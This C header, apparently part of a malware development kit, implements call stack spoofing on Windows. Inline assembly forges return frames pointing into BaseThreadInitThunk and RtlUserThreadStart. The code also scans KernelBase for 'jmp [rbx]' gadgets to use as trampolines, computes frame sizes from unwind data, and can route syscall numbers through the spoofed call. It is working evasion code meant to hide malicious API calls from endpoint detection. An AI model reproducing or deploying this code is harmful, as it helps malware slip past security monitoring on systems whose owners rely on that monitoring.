/**
 * @file Spoof.h
 * @author Ky4meru (@ky4meru)
 * @brief Call stack spoofing via synthetic frames.
 * @version 0.4
 * @date 2026-09-15
 * @copyright Copyright (c) 2024-2026
 */

#ifndef _MDK_SPOOF_H_
#define _MDK_SPOOF_H_

#include "Internals.h"
#include "Memory.h"

/// @private
MDK_TEXT_SEC(MDK) MDK_INLINE_ASSEMBLY static LPVOID MdkSpoofStub(_In_ LPVOID arg1, _In_ LPVOID arg2, _In_ LPVOID arg3, _In_ LPVOID arg4, _In_ MDK_PSPOOF_PARAMETERS prm, _In_ LPVOID function, _In_ LPVOID num, _In_ LPVOID arg5, _In_ LPVOID arg6, _In_ LPVOID arg7, _In_ LPVOID arg8, _In_ LPVOID arg9, _In_ LPVOID arg10, _In_ LPVOID arg11, _In_ LPVOID arg12)
{
    __asm
    {
        pop rax
        mov r10, rdi
        mov r11, rsi
        mov rdi, [rsp + 32]
        mov rsi, [rsp + 40]
        mov[rdi + 24], r10
        mov[rdi + 88], r11
        mov[rdi + 96], r12
        mov[rdi + 104], r13
        mov[rdi + 112], r14
        mov[rdi + 120], r15
        mov r12, rax
        xor r11, r11
        mov r13, [rsp + 0x30]
        mov r14, 0x200
        add r14, 8
        add r14, [rdi + 56]
        add r14, [rdi + 48]
        add r14, [rdi + 32]
        sub r14, 0x20
        mov r10, rsp
        add r10, 0x30

        looping:
            xor r15, r15
            cmp r11d, r13d
            je finish
            sub r14, 8
            mov r15, rsp
            sub r15, r14
            add r10, 8
            push qword ptr [r10]
            pop qword ptr [r15]
            add r11, 1
            jmp looping

        finish:
            sub rsp, 0x200
            push 0
            sub rsp, [rdi + 56]
            mov r11, [rdi + 64]
            mov[rsp], r11
            sub rsp, [rdi + 32]
            mov r11, [rdi + 40]
            mov[rsp], r11
            sub rsp, [rdi + 48]
            mov r11, [rdi + 80]
            mov[rsp], r11
            mov r11, rsi
            mov[rdi + 8], r12
            mov[rdi + 16], rbx
            lea rbx, [rip + fixup]
            mov[rdi], rbx
            mov r10, rcx
            mov rbx, rdi
            mov rax, [rdi + 72]
            jmp r11

        fixup:
            mov rcx, rbx
            add rsp, 0x200
            add rsp, [rbx + 56]
            add rsp, [rbx + 48]
            add rsp, [rbx + 32]
            mov rbx, [rcx + 16]
            mov rsi, [rcx + 88]
            mov r13, [rcx + 104]
            mov r12, [rcx + 96]
            mov r15, [rcx + 120]
            mov r14, [rcx + 112]
            mov rdi, [rcx + 24]
            push rax
            xor rax, rax
            pop rax
            jmp qword ptr [rcx + 8]
    }
}

/// @private
MDK_TEXT_SEC(MDK) static DWORD MdkCalculateFunctionStackSize(_In_ PRUNTIME_FUNCTION fun, _In_ DWORD64 img)
{
    DWORD op = 0;
    DWORD inf = 0;
    DWORD idx = 0;
    DWORD off = 0;
    DWORD tot = 0;
    MDK_PUNWIND_INFO uwi = NULL;

    if (!fun)
    {
        return 0;
    }

    uwi = (MDK_PUNWIND_INFO)(fun->UnwindData + img);

    while (idx < uwi->CountOfCodes)
    {
        op = uwi->UnwindCode[idx].UnwindOp;
        inf = uwi->UnwindCode[idx].OpInfo;

        switch (op)
        {
        case UWOP_PUSH_NONVOL:
        {
            tot += 8;
            break;
        }
        case UWOP_SAVE_NONVOL:
        {
            idx += 1;
            break;
        }
        case UWOP_ALLOC_SMALL:
        {
            tot += ((inf * 8) + 8);
            break;
        }
        case UWOP_ALLOC_LARGE:
        {
            idx += 1;
            off = uwi->UnwindCode[idx].FrameOffset;

            if (inf == 0)
            {
                off *= 8;
            }
            else
            {
                idx += 1;
                off += (uwi->UnwindCode[idx].FrameOffset << 16);
            }

            tot += off;
            break;
        }
        case UWOP_SET_FPREG:
        {
            break;
        }
        default:
        {
            break;
        }
        }

        idx += 1;
    }

    if (0 != (uwi->Flags & UNW_FLAG_CHAININFO))
    {
        idx = uwi->CountOfCodes;

        if (0 != (idx & 1))
        {
            idx += 1;
        }

        fun = (PRUNTIME_FUNCTION)(&uwi->UnwindCode[idx]);

        return MdkCalculateFunctionStackSize(fun, img);
    }

    tot += 8;

    return tot;
}

/// @private
MDK_TEXT_SEC(MDK) static BOOL MdkWrapperFunctionStackSize(_In_ LPVOID addr, _Inout_ PDWORD size)
{
    MDK_DECL_DLL(Ntdll);
    MDK_DECL_PROC(RtlLookupFunctionEntry);

    DWORD64 img = 0;
    PRUNTIME_FUNCTION fun = NULL;

    if (!addr)
    {
        return FALSE;
    }

    fun = (PRUNTIME_FUNCTION)MDK_CALL_PROC(MDK_GET_PROC(Ntdll, RtlLookupFunctionEntry), addr, &img, NULL);

    if (!fun)
    {
        return FALSE;
    }

    *size = MdkCalculateFunctionStackSize(fun, img);

    return *size != 0;
}

/// @private
MDK_TEXT_SEC(MDK) static LPVOID MdkFindSpoofTrampoline(_In_ LPVOID module)
{
    MDK_DECL_DLL(Ntdll);
    MDK_DECL_PROC(RtlRandomEx);
    MDK_DECL_SEC(text);

    DWORD cnt = 0;
    DWORD tsz = 0;
    LPVOID gad[10];
    LPVOID ret = NULL;
    LPVOID txt = NULL;
    ULONG seed = 0x04515;
    ULONG rnd = 0;

    MdkZeroMemory(gad, sizeof(gad));

    txt = MdkGetSectionAddressByHash(module, MDK_HASH_text, &tsz);

    if (!txt)
    {
        return NULL;
    }

    for (DWORD i = 0; i < (tsz - 2); ++i)
    {
        if (((PBYTE)txt)[i] == 0xFF && ((PBYTE)txt)[i + 1] == 0x23)
        {
            gad[cnt] = MDK_CAST_VPTR(MDK_CAST_UPTR(txt) + i);
            cnt++;

            if (cnt == 10)
            {
                break;
            }
        }
    }

    if (!cnt)
    {
        return NULL;
    }

    rnd = MDK_CAST_UINT(MDK_CALL_PROC(MDK_GET_PROC(Ntdll, RtlRandomEx), &seed));
    rnd %= cnt;

    ret = gad[rnd];
    MdkZeroMemory(gad, sizeof(gad));

    return ret;
}

/// @private
MDK_TEXT_SEC(MDK) static LPVOID MdkSpoofCall(_In_ LPVOID function, _In_ DWORD ssn, _In_ LPVOID arg1, _In_ LPVOID arg2, _In_ LPVOID arg3, _In_ LPVOID arg4, _In_ LPVOID arg5, _In_ LPVOID arg6, _In_ LPVOID arg7, _In_ LPVOID arg8, _In_ LPVOID arg9, _In_ LPVOID arg10, _In_ LPVOID arg11, _In_ LPVOID arg12)
{
    MDK_DECL_DLL(Kernel32);
    MDK_DECL_DLL(KernelBase);
    MDK_DECL_DLL(Ntdll);
    MDK_DECL_PROC(BaseThreadInitThunk);
    MDK_DECL_PROC(RtlUserThreadStart);

    MDK_SPOOF_PARAMETERS prm;
    LPVOID ret = NULL;
    LPVOID bti = NULL;
    LPVOID rut = NULL;
    LPVOID res = NULL;

    MdkZeroMemory(&prm, sizeof(prm));

    bti = MDK_GET_PROC(Kernel32, BaseThreadInitThunk);
    rut = MDK_GET_PROC(Ntdll, RtlUserThreadStart);

    ret = MDK_CAST_VPTR(MDK_CAST_UPTR(bti) + 0x14);

    if (!MdkWrapperFunctionStackSize(ret, (PDWORD)&prm.BaseThreadInitThunkStackSize))
    {
        return NULL;
    }

    prm.BaseThreadInitThunkReturnAddress = ret;

    ret = MDK_CAST_VPTR(MDK_CAST_UPTR(rut) + 0x21);

    if (!MdkWrapperFunctionStackSize(ret, (PDWORD)&prm.RtlUserThreadStartStackSize))
    {
        return NULL;
    }

    prm.RtlUserThreadStartReturnAddress = ret;

    do
    {
        prm.Trampoline = MdkFindSpoofTrampoline(MdkGetModuleHandleByHash(MDK_HASH_KernelBase));
        MdkWrapperFunctionStackSize(prm.Trampoline, (PDWORD)&prm.TrampolineStackSize);
    } while (!prm.TrampolineStackSize || MDK_CAST_UINT(prm.TrampolineStackSize) < 0xa0);

    if (ssn != 0)
    {
        prm.Ssn = MDK_CAST_VPTR(ssn);
    }

    res = MdkSpoofStub(arg1, arg2, arg3, arg4, &prm, function, MDK_CAST_VPTR(8), arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12);
    MdkZeroMemory(&prm, sizeof(prm));

    return res;
}

#endif // _MDK_SPOOF_H_
